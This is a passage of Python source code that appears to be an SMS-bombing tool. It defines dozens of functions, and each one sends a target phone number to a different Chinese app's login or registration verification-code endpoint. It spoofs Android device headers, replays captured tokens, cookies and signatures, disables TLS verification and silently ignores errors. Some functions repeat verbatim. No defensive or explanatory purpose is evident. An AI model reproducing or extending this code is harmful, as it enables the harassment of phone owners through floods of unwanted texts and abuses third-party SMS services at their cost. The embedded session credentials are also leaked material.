    url = 'https://zhibo.ishuaji.cn/account/user/logincap/v2.html'
    payload = {
        'extendId': 'DhbApNe7Dh3LCh10pNNKDNoKphtb-3RW-KNwD3-X-7CLfnNXpXbufu-XCXC7CubTfuNxPnsXpupTpQaWp7Nxpwll',
        'os': 'android',
        'shareid': '',
        'appversion': '50500',
        'cert': 'R7CKfhGwCn-yC7eWR7s5p7NkCXNKChNKf9bhCQ-wPENl',
        'manufactruer': 'OnePlus',
        'pkg': 'qiezi',
        'driverid': '445df3c265af2378de3a82390614199ca',
        'shell': 'shel172',
        'phone': phone,
        'bootloader': 'unknown',
        'model': 'PJE110',
        'device': 'OP5CF9L1',
        'brand': 'OnePlus',
        'cid': 'gdop'
    }
    headers = {'User-Agent': 'okhttp/3.12.1', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
    try:
        requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_zqqds(phone):
    url = 'https://freevideo.zqqds.cn/free-video-portal/portal/1107'
    payload = {'phone': phone, 'showAppName': '河马剧场', 'type': 0}
    headers = {
        'User-Agent': 'okhttp/4.10.0',
        'Accept-Encoding': 'gzip',
        'alg': 'HG45LKBS',
        'sign': 'ICe/ickjsxM4lQXRz0jt+1A7qcl5zD0C5xcEvWvRK1s=',
        'datas': '{"freeflow":0,"version":"3.4.0","pname":"com.dz.hmjc","channelCode":"HMTFFQD1000032","utdidTmp":"A202606120027076168uGu1n","token":"","utdid":"114695049b2dbc067822c251105876b5","os":"android","osv":36,"brand":"OnePlus","model":"PJE110","manu":"OnePlus","userId":"2834534307","launch":"shortcut","mchid":"HMTFFQD1000032","nchid":"HMJC1000002","session1":"271916f2-006c-4f42-a159-76239cf570f9","session2":"271916f2-006c-4f42-a159-76239cf570f9","startScene":"shortcut","recSwitch":true,"installTime":1781193865025,"p":55,"nonce":"bd021ffa88964c9aa3aeb9b5a0df16e6","timeZone":"Asia/Shanghai","timestamp":"1781240133876","boxId":"BATWC0+1KvTGG1rgNN6oVJ1iW74nLS9bcPeZOjoe6lJYxqK0P5DFLNEc7DVW8GPRABGHat2ZURdDlGNh4EJBuUQ=="}',
        'wetruwtty': 'mhdfiheowjfcslkjfwojo636',
        'x-request-id': 'a46ae45f-f212-47bf-86a4-22fa2bdc7290',
        'content-type': 'application/json; charset=utf-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_ishuaji_reg(phone):
    url = 'https://zhibo.ishuaji.cn/account/user/regcap.html'
    payload = {
        'extendId': 'DhbApNe7Dh3LCh10pNNKDNoKphtb-3RW-KNwD3-X-7CLfnNXpXbufu-XCXC7CubTfuNxPnsXpupTpQaWp7Nxpwll',
        'os': 'android',
        'appversion': '30503',
        'cert': 'pXokPnoLpX1HfECwpXN5PQC5ChayCnRyfEoxCh37C9el',
        'manufactruer': 'OnePlus',
        'imsi': '',
        'pkg': 'xs',
        'os2': 'W6   _ݠd',
        'randomid': '6a6867af3e62753145bc1df9235d31f6',
        'driverid': '4147a0df2505e5ff8a7a34761cc787550',
        'shell': 'shell18',
        'phone': phone,
        'bootloader': 'unknown',
        'model': 'PJE110',
        'plat': '12',
        'device': 'OP5CF9L1',
        'brand': 'OnePlus',
        'cid': 'xsop'
    }
    headers = {'User-Agent': 'okhttp/3.12.1', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
    try:
        requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_xinpianchang(phone):
    url = 'https://passport.xinpianchang.com/api/user-center/captcha/send'
    payload = {'phone': phone, 'regionCode': '+86', 'type': 5}
    headers = {
        'User-Agent': 'NewStudios/2.9.2 (com.xinpianchang.newstudios; build:2920; Android 16; Android 16; OnePlus PJE110)',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip',
        'cache-control': 'max-age=0',
        'device-id': 'fcc2b455796a3ed2ab72f7423a8d94f4',
        'accept-language': 'zh-CN',
        'accept-version': '2.4.2',
        'authorization': '0EC53039DD27BE709DD27B4BC1DD27BA11CDD27BD1E21A692F85',
        'sa-distinct-id': 'fcc2b455796a3ed2ab72f7423a8d94f4',
        'content-type': 'application/json; charset=UTF-8',
        'Cookie': 'Device_ID=4d1e5fb0-5a3a-45e1-b4c2-471eb2057929; Authorization=0EC53039DD27BE709DD27B4BC1DD27BA11CDD27BD1E21A692F85'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_njtianyiwl(phone):
    url = 'https://njtianyiwl.cn/app-api/member/auth/send-sms-code'
    payload = {'mobile': phone, 'scene': '1'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_cdinmu(phone):
    url = 'https://mlive.cdinmu.com/srv/app-auth/send-code'
    payload = {'mobPhone': phone, 'areaCode': '+86'}
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'Cookie': 'uuid=c17a2de2-3145-4396-a074-7f34c176c6ae'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_601book(phone):
    url = 'https://zfs.601book.com/api/fastApp/nologin/sendSms'
    params = {'phone': phone, 'appId': 'com.youmai.fan', 'replaceShortDramaWithVideo': '0', 'channelNum': '600001'}
    headers = {
        'User-Agent': 'okhttp/4.11.0',
        'Accept-Encoding': 'gzip',
        'access_token': '161478025_975c7926a89c44528f83942a9f791852',
        'version': '1.2.0.1',
        'package_name': '',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        requests.post(url, data=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_youge(phone):
    url = 'http://116.62.116.54:8096/youge-app/api/v1/sms/aliSend'
    payload = {'auth_type': '', 'mobile': phone, 'is_test': '0', 'event': 'register'}
    headers = {
        'Host': '116.62.116.54:8096',
        'User-Agent': 'okhttp/4.4.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'TOKEN': '',
        'type': 'Android',
        'version': '1.2.4',
        'versionNum': '18'
    }
    try:
        requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_boguapp(phone):
    url = 'http://app.boguapp.top/api/sms/send'
    payload = {'mobile': phone, 'event': 'register'}
    headers = {
        'User-Agent': 'Android',
        'Accept-Encoding': 'identity',
        'source_model': 'mobile',
        'platform': 'android',
        'token': ''
    }
    try:
        requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_91fxyz(phone):
    url = 'http://91f.xyz:8080/user/sendVerifyCode'
    params = {'phoneNumber': phone}
    headers = {
        'Host': '91f.xyz:8080',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Access-Control-Allow-Origin': '*',
        'IS_APP_REQ': 'APP_REQ',
        'APP_VERSION': '2.0.22',
        'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept',
        'Content-Type': 'application/json;charset=UTF-8'
    }
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_zto(phone):
    url = 'http://api.z-t-o.com:8080/api/phone/send-code'
    payload = {'phoneNumber': phone}
    headers = {
        'Host': 'api.z-t-o.com:8080',
        'User-Agent': 'Dart/3.6 (dart:io)',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_hengxingai(phone):
    url = 'https://www.hengxingai.net/v2/login/getLoginCode'
    payload = {'user_login': phone}
    headers = {
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 16; PJE110 Build/TP1A.220905.001)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'TE': 'gzip, deflate; q=0.5'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_minshengji(phone):
    url = 'https://app.xgg.minshengji.com/xggapi/api/login/getSmsCode'
    payload = {'country_code': '86', 'mobile': phone, 'mobileid': 'ad5cdf12a29d08c7c2daf72d8c7093d1', 'sign': '5cd6ee3d27de727bb45da4e6f977d5e4', 'source': 'android', 'time': '1781256456'}
    headers = {
        'User-Agent': 'okhttp-okgo-3.11.0?mod=PJE110&os=16&api=36&man=OnePlus&pad=0&emu=0&width=1080&height=2376&appVer=1.2.7',
        'Accept-Encoding': 'gzip',
        'Accept-Language': 'zh-CN,zh;q=0.8',
        'referer': 'https://app.xgg.minshengji.com',
        'Content-Type': 'application/json;charset=utf-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_maimaidashop(phone):
    url = 'https://api.front.maimaidashop.com/api/front/login/send/code'
    payload = {'phone': phone}
    headers = {
        'User-Agent': 'okhttp/3.12.13',
        'Accept-Encoding': 'gzip',
        'request-source': 'APP',
        'Content-Type': 'application/json; charset=utf-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_bjxunyu(phone):
    url = 'https://api.bjxunyu.com/xunyu/user/code/send'
    payload = {'target': phone, 'code_type': 'login', 'method': 'phone'}
    headers = {
        'User-Agent': 'Dart/3.9 (dart:io)',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'authorization': 'Bearer'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_ranwenba8(phone):
    url = 'https://api.ranwenba8.vip/api/v1/auth/send-code'
    payload = {'phone': phone}
    headers = {
        'User-Agent': 'Dart/3.8 (dart:io)',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_echoic(phone):
    url = 'https://api.echoic.cn/api/sms/send'
    payload = {'phone': phone, 'scene': 1}
    headers = {
        'User-Agent': 'Dart/3.11 (dart:io)',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_xinyueyukj(phone):
    url = 'https://newduanju.xinyueyukj.com/api/public/sendSms'
    payload = {'mobile': phone, 'sign': 'login'}
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Accept-Encoding': 'gzip',
        'device': 'android',
        'version': '1.4.2',
        'deviceid': '',
        'x-jx-nonce': '37b324ac-e61e-4f21-aee4-40bf58c7e309',
        'x-jx-timestamp': '1781258072',
        'x-jx-signature': '2e84bd20763d3b6a75b84fe5d936e78fc2d11a6efd55aec4a8797770ec9cadff'
    }
    try:
        requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_shenshuangjc(phone):
    url = 'https://items.shenshuangjc.com/api/code/sendPhoneVerifyCode'
    payload = {'mobile': phone, 'type': '1', 'verify_code': None, 'user_sessionId': 'Av09kbbtacqeZkS8jsOBDWvpW9AjtQsW'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'Token': 'false',
        'Sessid': 'Av09kbbtacqeZkS8jsOBDWvpW9AjtQsW',
        'Client-Type': 'android',
        'Cookie': 'PHPSESSID=Av09kbbtacqeZkS8jsOBDWvpW9AjtQsW'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_cqryjkxxzx(phone):
    url = 'https://appapi.cqryjkxxzx.top/App/SendSMS'
    params = {'mobile': phone}
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Accept-Encoding': 'gzip',
        'x-market': 'qh',
        'content-length': '0'
    }
    try:
        requests.post(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_daoran(phone):
    url = 'https://fly.daoran.tv/API_UBP/send/login/code'
    payload = {
        'phoneNumber': phone,
        'project': 'lyhxcx',
        'userId': '215d049b47e9e4f4666bf96848ad2775',
        'sign': 'MmhTLnUjLLHi48rk9zwBANI3OX3f5EffDpHK7XK6pDYsKlViUBkEq2L3rvuB9paLIxg/fdNDY3DZ/pO3447Ipg==',
        'item': 'o3'
    }
    headers = {
        'User-Agent': 'okhttp/3.12.10',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'md5': 'SkvyrWqK9QHTdCT12Rhxunjx+WwMTe9y4KwgeASFDhbYabRSPskR0Q==',
        'sign': 'MmhTLnUjLLHi48rk9zwBANI3OX3f5EffDpHK7XK6pDYsKlViUBkEq2L3rvuB9paLIxg/fdNDY3DZ/pO3447Ipg==',
        'project': 'lyhxcx',
        'item': 'o3',
        'Content-Type': 'application/json; charset=UTF-8',
        'Cookie': 'JSESSIONID=D0EAFF1A08B9B982AFBF962462F46C7C'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_dafdk(phone):
    url = 'http://api.dafdk.cn:8080/auth/send_captcha'
    payload = {'mobile': phone, 'type': 'register'}
    headers = {
        'Host': 'api.dafdk.cn:8080',
        'User-Agent': 'okhttp/3.12.13',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Authorization': 'Bearer',
        'Content-Type': 'application/json; charset=utf-8',
        'Cookie': 'XSRF-TOKEN=eyJpdiI6ImVDNzBrb3g4a0syL0txdXUiLCJ2YWx1ZSI6Ijk1RkNFOUdoTGN3VFNDTUlkSkNxdWpwa3FGN09xUkhRb0RtMjNpc3RodFE1MWxxRlk4N21xZXlaU3JpWHp6RDR4M3UxUzZ5aytXS0FlYmVsRGp5a3pWa1AwUDcvdThyN0EvUkowc093RVdFYSIsIm1hYyI6IiIsInRhZyI6IjVxWXhjV1lTR3JNYWpidjVna0JBQXc9PSJ9; _session=eyJpdiI6IkdjSjlmVEtvYnlyTEdIV2YiLCJ2YWx1ZSI6Ijg4eUU1TnpNanJycnI5T0NpUTZHMERGR3NWbXlzem5iR0dZQkVKSWszTlFwVzEyKzhuaHN4NGg3cXhtTE9kaWFoYVhMYzQxUVJENWhGbzE4MFhJczVVb1JLNURRRzdtbzlWMjVkUnFoMjdZaiIsIm1hYyI6IiIsInRhZyI6IlFtWG8wRUJRQ3JWZVhQdHJOZkp4cVE9PSJ9'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_bimo8(phone):
    url = 'https://app-api.quick.bimo8.com/panda/code'
    params = {'mobile': phone, 'type': '3'}
    headers = {
        'User-Agent': 'Dart/3.9 (dart:io)',
        'Accept-Encoding': 'gzip',
        'client-os': 'android',
        'client-model': 'PJE110',
        'client-name': 'huaguoshanapp',
        'client-type': 'app-series',
        'client-version': '1.3.0',
        'client-brand': 'OnePlus',
        'client-token': 'V2.VneEKVEPK0FVM5rq.9474d0824557ce325b24427dd0155ffd'
    }
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_aizhenyue(phone):
    url = 'https://api.aizhenyue.com/api/sms/send'
    params = {'t': '1781259832853'}
    payload = {'mobile': phone, 'event': 'smlogin'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'token': ''
    }
    try:
        requests.post(url, params=params, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_xingzhits(phone):
    url = 'https://xzw.api.xingzhits.cn/app/verify/login/sms/code/send'
    payload = {'mobile': phone}
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'appVersion': '95',
        'clientSource': '1',
        'deviceId': '2f7f5cae6297f37f2b49e366ae2b61535',
        'Content-Type': 'application/json; charset=UTF-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_qingk(phone):
    url = 'https://wdjapi.qingk.cn/login/sendVerifyCode'
    params = {
        'phoneNum': phone,
        'yy_appid': '1001',
        'passid': '10001',
        'package_name': 'com.haikan.hicontheater',
        'version_code': '213',
        'version_name': '2.1.3',
        'idfv': '',
        'android_id': 'b8f5f1f428a19f6c',
        'platform': 'android'
    }
    headers = {
        'User-Agent': 'Dart/3.8 (dart:io)',
        'Accept-Encoding': 'gzip',
        'udid': '1e71e49635030cf628e3518d2b7f5dcb30d75e167dd2f96f875007da4a2e4b04'
    }
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_bimo8(phone):
    url = 'https://app-api.quick.bimo8.com/panda/code'
    params = {'mobile': phone, 'type': '3'}
    headers = {
        'User-Agent': 'Dart/3.9 (dart:io)',
        'Accept-Encoding': 'gzip',
        'client-os': 'android',
        'client-model': 'PJE110',
        'client-name': 'huaguoshanapp',
        'client-type': 'app-series',
        'client-version': '1.3.0',
        'client-brand': 'OnePlus',
        'client-token': 'V2.VneEKVEPK0FVM5rq.9474d0824557ce325b24427dd0155ffd'
    }
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_aizhenyue(phone):
    url = 'https://api.aizhenyue.com/api/sms/send'
    params = {'t': '1781268509916'}
    payload = {'mobile': phone, 'event': 'smlogin'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'token': ''
    }
    try:
        requests.post(url, params=params, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_xingzhits(phone):
    url = 'https://xzw.api.xingzhits.cn/app/verify/login/sms/code/send'
    payload = {'mobile': phone}
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'appVersion': '95',
        'clientSource': '1',
        'deviceId': '2f7f5cae6297f37f2b49e366ae2b61535',
        'Content-Type': 'application/json; charset=UTF-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_sywj(phone):
    url = 'https://htvideo-portal-api.sywj.cn/auth/sms/login/code'
    payload = {'mobile': phone}
    headers = {
        'User-Agent': 'sywj/2.3.0 Android OnePlus/PJE110 Android16 SDK36 oppo',
        'Accept-Encoding': 'gzip',
        'token': '',
        'x-device-id': '6786e6bb3cd9fa0747673281a25a0a92',
        'content-type': 'application/json; charset=UTF-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_yidanbo(phone):
    url = 'https://m.yidanbo.com/api/v2/wanlshop/sms/send'
    payload = {'areacode': '+86', 'event': 'register', 'mobile': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'Sign': '5dad305868dbc6d563efff680c1869ed',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'App-Client': 'app-wanlshop',
        'uuid': '005fdfbe3d794882910997edb690b403'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_ynbit(phone):
    url = f'https://dance202.ynbit.com/appuser/verifycode/{phone}'
    headers = {
        'User-Agent': 'Dart/3.5 (dart:io)',
        'Accept-Encoding': 'gzip',
        'deviceid': '487239f613ff6097',
        'appversion': '2.0.163',
        'application': 'YnBitApp',
        'packagename': 'com.ynbit.yunguangshiting',
        'buildnumber': '113',
        'content-type': 'application/json',
        'platformtype': 'Android'
    }
    try:
        requests.get(url, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_fjgdwl(phone):
    url = f'https://rkrddepa.fjgdwl.com/fujuApp/api/user/login/smsCode/{phone}'
    payload = {'deviceId': '536f4d1024555999fa985f829e1e54e6', 'accessToken': '', 'version': '1.2.8', 'data': {}}
    headers = {'User-Agent': 'Dart/3.10 (dart:io)', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json'}
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_whhsxxgs(phone):
    url = 'https://appapi.whhsxxgs.top/App/SendSMS'
    params = {'mobile': phone}
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'X-Market': 'JM',
        'Content-Length': '0',
        'Cookie': '7ba146e1-21d1-4db6-a404-2934e42eab1c=9f8eeeecba2ae1677ce7ab38eef42179'
    }
    try:
        requests.post(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_hzbzh(phone):
    url = 'https://www.hzbzh.com/prod-api/auth/app/sms/code'
    data = {'mobile': phone, 'scene': 'login'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        requests.post(url, data=data, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_meowhub(phone):
    url = 'https://app.api.meowhub.cn/api/app/auth/sms/send'
    payload = {'mobile': phone, 'scene': 'login'}
    headers = {
        'User-Agent': 'Dart/3.11 (dart:io)',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'clientid': 'hycollect_app'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_shengyinjiazhi(phone):
    url = 'https://www.shengyinjiazhi.com/api/captchaSms'
    payload = {'phonenumber': phone}
    headers = {
        'User-Agent': 'uni-app-x/5.04',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'authorization': 'Bearer',
        'Content-Type': 'application/json; charset=utf-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_yangjian(phone):
    url = 'https://capybara.yangjian.co/api/v1/auth/sms/send'
    payload = {'phone': phone, 'type': 'register'}
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_shouzhetianxia(phone):
    url = 'https://api.shouzhetianxia.com/applet/user/sendCode'
    payload = {'phonenumber': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'Authorization': 'Bearer undefined'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_taskmessage(phone):
    url = 'https://app.test.taskmessage.com/rx_api/sendMobileCode'
    payload = {'mobile': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'logintoken': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImtleUlkIn0.eyJpc3MiOiJzb2wiLCJhdWQiOiJ1c2VyIiwibmJmIjoxNzgxMzM0ODczLCJpYXQiOjE3ODEzMzQ4NzMsIm1vYmlsZSI6IiIsInVzZXJfaWQiOiIzNjAifQ.Xe1xftLZUJ7cei18yz7jLhCGLq0amPezSLp1Wyt1DgM'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_zklf(phone):
    url = 'https://dfu.zklf-tech.com/api/v1/auth/sms/code'
    params = {'mobile': phone, 'smsType': 'REGISTER'}
    headers = {'User-Agent': 'okhttp/5.2.0', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
    try:
        requests.post(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_ming(phone):
    url = 'https://ppl.ming.net.cn/api/sms/send'
    payload = {'mobile': phone, 'event': 'mobilelogin'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'token': ''
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_laniakeasc(phone):
    url = 'https://colo-app.laniakeasc.com/prod-api/api/Sms/sendCode'
    data = {'mobile': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': 'Bearer',
        'envVersion': 'release',
        'Client-Type': 'Android'
    }
    try:
        requests.post(url, data=data, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_zhuxing(phone):
    url = 'http://app.zhuxing.vip/api/sms/send'
    payload = {'mobile': phone, 'event': 'mobilelogin'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_zhuxing_register(phone):
    url = 'http://app.zhuxing.vip/api/sms/send'
    payload = {'mobile': phone, 'event': 'register'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_chukexia(phone):
    url = 'http://app.chukexia.com.cn/server/user/registerCode'
    params = {'phoneNumber': phone}
    headers = {
        'User-Agent': 'okhttp/4.2.2',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'cache-control': 'no-cache',
        'version': '1.0.4'
    }
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_5kejia(phone):
    url = f'https://wap.5kejia.com/sqx_fast/app/Login/sendMsg/{phone}/1'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        requests.get(url, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_laidaquan(phone):
    url = 'https://www.laidaquan.com'
    params = {'s': '/ApiIndex/sendsms', 'aid': '2', 'platform': 'app', 'session_id': 'e8199f3666e25499ea70721cc45c721b', 'pid': '0', 'scene': '1001'}
    payload = {'tel': phone}
    headers = {
